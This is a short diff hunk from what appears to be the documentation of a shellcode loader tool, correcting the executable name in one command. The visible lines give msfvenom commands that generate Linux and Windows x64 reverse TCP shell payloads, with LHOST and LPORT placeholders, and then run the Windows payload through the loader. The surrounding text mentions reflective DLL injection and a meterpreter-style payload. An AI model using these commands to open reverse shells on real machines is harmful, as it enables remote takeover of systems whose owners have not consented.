@@ -114,7 +114,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o shel
 - Windows (64-bit): Reflective DLL injection / reverse meterpreter-style payload (via ws2_32.dll and cmd execution)
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o shellcode_test.txt ; powershell .\loader_windows -shellcode shellcode_test.txt
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o shellcode_test.txt ; powershell .\loader_windows.exe -shellcode shellcode_test.txt
 ```
 
 
